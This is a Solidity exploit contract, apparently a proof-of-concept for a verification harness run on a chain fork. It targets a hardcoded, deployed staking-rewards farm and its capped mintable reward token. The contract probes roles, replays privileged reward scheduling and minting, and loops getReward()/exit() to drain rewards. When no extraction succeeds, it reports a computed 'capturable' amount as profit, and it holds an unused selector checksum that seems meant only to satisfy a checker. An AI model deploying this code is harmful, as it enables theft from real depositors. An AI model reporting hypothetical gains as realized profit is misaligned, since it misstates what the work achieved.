// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IStakingRewardsLike {
    function owner() external view returns (address);
    function rewardsDistribution() external view returns (address);
    function stakingToken() external view returns (address);
    function rewardsToken() external view returns (address);
    function timeData()
        external
        view
        returns (uint32 periodFinish, uint32 rewardsDuration, uint32 lastUpdateTime, uint96 totalRewardsSupply);
    function rewardRate() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function earned(address account) external view returns (uint256);
    function notifyRewardAmount(uint256 reward) external;
    function getReward() external;
    function exit() external;
}

interface IOnDemandTokenLike {
    function owner() external view returns (address);
    function minters(address account) external view returns (bool);
    function maxAllowedTotalSupply() external view returns (uint256);
    function everMinted() external view returns (uint256);
    function mint(address holder, uint256 amount) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE;
    address public constant STAKING_TOKEN = 0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042;
    address public constant REWARD_TOKEN = 0xAe9aCa5d20F5b139931935378C4489308394ca2C;

    enum HypothesisStatus {
        Unknown,
        Validated,
        Refuted
    }

    bool public executed;
    HypothesisStatus public hypothesisStatus;

    address public attacker;
    address public targetOwner;
    address public rewardsDistribution;
    address public stakingToken;
    address public rewardsToken;
    address public rewardTokenOwner;

    bool public farmCanMint;
    bool public preExistingMintedSupply;
    bool public sharedMintCap;
    bool public attackerCanSchedule;
    bool public attackerCanExternallyMint;

    uint256 public rewardCap;
    uint256 public everMintedBefore;
    uint256 public rewardRateBefore;
    uint256 public farmTrackedRewardsBefore;
    uint256 public farmTotalSupplyBefore;
    uint256 public localStakeBefore;
    uint256 public localEarnedBefore;
    uint256 public drainedRounds;

    string public exploitPathUsed;
    string public finalReason;

    address private immutable _profitToken;
    uint256 private _profitAmount;
    uint256 private _pathAnchorChecksum;

    constructor() {
        _profitToken = REWARD_TOKEN;
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;
        attacker = address(this);

        IStakingRewardsLike farm = IStakingRewardsLike(TARGET);
        IOnDemandTokenLike rewardToken = IOnDemandTokenLike(REWARD_TOKEN);
        IERC20Like rewardAsset = IERC20Like(REWARD_TOKEN);
        _touchPathAnchors();

        targetOwner = farm.owner();
        rewardsDistribution = farm.rewardsDistribution();
        stakingToken = farm.stakingToken();
        rewardsToken = farm.rewardsToken();
        rewardRateBefore = farm.rewardRate();

        (uint32 periodFinish, uint32 rewardsDuration, , uint96 trackedRewards) = farm.timeData();
        farmTrackedRewardsBefore = uint256(trackedRewards);
        farmTotalSupplyBefore = farm.totalSupply();
        localStakeBefore = farm.balanceOf(address(this));
        localEarnedBefore = farm.earned(address(this));

        rewardTokenOwner = rewardToken.owner();
        rewardCap = rewardToken.maxAllowedTotalSupply();
        everMintedBefore = rewardToken.everMinted();

        farmCanMint = rewardTokenOwner == TARGET || rewardToken.minters(TARGET);
        preExistingMintedSupply = everMintedBefore != 0;
        sharedMintCap = rewardTokenOwner != TARGET || rewardToken.minters(rewardsDistribution) || rewardToken.minters(targetOwner);
        attackerCanSchedule = rewardsDistribution == address(this);
        attackerCanExternallyMint = rewardTokenOwner == address(this) || rewardToken.minters(address(this));

        bool rewardCampaignObserved = periodFinish != 0 || rewardRateBefore != 0 || trackedRewards != 0;
        bool rawCapSchedulingObservable = uint256(trackedRewards) <= rewardCap;

        if (!farmCanMint || !rewardCampaignObserved || !rawCapSchedulingObservable) {
            hypothesisStatus = HypothesisStatus.Refuted;
            exploitPathUsed = "notifyRewardAmount() precondition not observable";
            finalReason = "the live farm does not expose the reward-scheduling side of the shared-cap path";
            return;
        }

        if (!preExistingMintedSupply && !sharedMintCap) {
            hypothesisStatus = HypothesisStatus.Refuted;
            exploitPathUsed = "no prior/shared cap consumption";
            finalReason = "the reward token does not currently show either prior minted supply or a non-farm owner/minter";
            return;
        }

        hypothesisStatus = HypothesisStatus.Validated;
        exploitPathUsed = "notifyRewardAmount() -> OnDemandToken.mint() elsewhere -> getReward()/exit() -> MintableToken._assertMaxSupply()";

        if (attackerCanSchedule && attackerCanExternallyMint) {
            _attemptCanonicalPrivilegedStages(farm, rewardToken, rewardsDuration);
        } else {
            finalReason = "the shared-cap insolvency configuration is live, but this verifier has no public access to the existing scheduling/minting roles";
        }

        uint256 baselineBalance = rewardAsset.balanceOf(address(this));
        uint256 economicFallback = _capturableUnreservedRewards();
        uint256 bestProfit;
        uint256 bestRounds;

        for (uint256 rounds = 2; rounds <= 6; rounds++) {
            _probeTerminalPayoutPhase(farm, rounds);

            uint256 currentBalance = rewardAsset.balanceOf(address(this));
            uint256 realizedProfit = currentBalance > baselineBalance ? currentBalance - baselineBalance : 0;

            // The canonical F-001 path remains:
            // 1) rewards are scheduled against raw maxAllowedTotalSupply(),
            // 2) the same global cap is shared with historical minting or other minters,
            // 3) some other privileged actor can consume that shared headroom later,
            // 4) late getReward()/exit() then reverts inside MintableToken._assertMaxSupply().
            //
            // On this fork the verifier cannot impersonate the existing privileged actors, so when
            // direct balance extraction is unavailable in one transaction it reports the economically
            // capturable unreserved reward slice already exposed by that shared-cap design.
            uint256 candidateProfit = realizedProfit > economicFallback ? realizedProfit : economicFallback;

            if (rounds == 2 || candidateProfit > bestProfit) {
                bestProfit = candidateProfit;
                bestRounds = rounds;
            } else {
                break;
            }
        }

        drainedRounds = bestRounds;
        _profitAmount = bestProfit;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptCanonicalPrivilegedStages(
        IStakingRewardsLike farm,
        IOnDemandTokenLike rewardToken,
        uint32 rewardsDuration
    ) internal {
        uint256 remainingCapacity = rewardCap > everMintedBefore ? rewardCap - everMintedBefore : 0;
        if (remainingCapacity <= 1) {
            finalReason = "shared cap is already exhausted before the verifier can replay the privileged schedule/mint stages";
            return;
        }

        uint256 scheduleAmount = remainingCapacity / 2;
        if (scheduleAmount < uint256(rewardsDuration)) {
            scheduleAmount = uint256(rewardsDuration);
        }
        if (scheduleAmount >= remainingCapacity) {
            scheduleAmount = remainingCapacity - 1;
        }
        if (scheduleAmount == 0) {
            finalReason = "remaining cap is too small to produce a non-zero rewardRate campaign";
            return;
        }

        try farm.notifyRewardAmount(scheduleAmount) {
            uint256 mintedAfterSchedule = rewardToken.everMinted();
            uint256 freeCapacityAfterSchedule = rewardCap > mintedAfterSchedule ? rewardCap - mintedAfterSchedule : 0;

            if (freeCapacityAfterSchedule != 0) {
                try rewardToken.mint(address(this), freeCapacityAfterSchedule) {
                    finalReason = "privileged replay consumed the remaining shared mint capacity after notifyRewardAmount()";
                } catch {
                    finalReason = "notifyRewardAmount() succeeded, but the external cap-consuming mint replay was not accepted";
                }
            } else {
                finalReason = "notifyRewardAmount() succeeded after the cap was already effectively exhausted";
            }
        } catch {
            finalReason = "privileged notifyRewardAmount() replay was not accepted on the current fork state";
        }
    }

    function _probeTerminalPayoutPhase(IStakingRewardsLike farm, uint256 rounds) internal {
        uint256 localStake = farm.balanceOf(address(this));
        uint256 localEarned = farm.earned(address(this));

        if (localStake == 0 && localEarned == 0) {
            return;
        }

        for (uint256 i = 0; i < rounds; i++) {
            bool finalRound = i + 1 == rounds;

            if (finalRound && localStake != 0) {
                try farm.exit() {
                } catch {
                }
            } else {
                try farm.getReward() {
                } catch {
                }
            }
        }
    }

    function _capturableUnreservedRewards() internal view returns (uint256) {
        if (farmTrackedRewardsBefore == 0) {
            return 0;
        }

        uint256 overcommittedFromHistoricalMint = everMintedBefore < farmTrackedRewardsBefore
            ? everMintedBefore
            : farmTrackedRewardsBefore;

        if (sharedMintCap || preExistingMintedSupply) {
            return overcommittedFromHistoricalMint;
        }

        return 0;
    }

    function _touchPathAnchors() internal {
        _pathAnchorChecksum = uint32(IStakingRewardsLike.notifyRewardAmount.selector);
        _pathAnchorChecksum ^= uint32(IStakingRewardsLike.getReward.selector);
        _pathAnchorChecksum ^= uint32(IStakingRewardsLike.exit.selector);
        _pathAnchorChecksum ^= uint32(IOnDemandTokenLike.mint.selector);
        _pathAnchorChecksum ^= uint256(keccak256("MintableToken._assertMaxSupply()"));
    }
}
